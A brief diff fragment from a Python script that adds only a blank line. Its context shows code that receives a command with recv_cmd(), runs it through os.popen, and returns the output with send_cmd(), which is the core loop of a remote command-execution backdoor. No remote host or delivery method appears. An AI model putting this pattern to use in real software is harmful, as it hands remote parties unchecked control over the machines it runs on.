@@ -21,4 +21,5 @@ def recv_cmd():
 	return cmd
 
 out = os.popen(recv_cmd()).read()
+
 send_cmd(out)
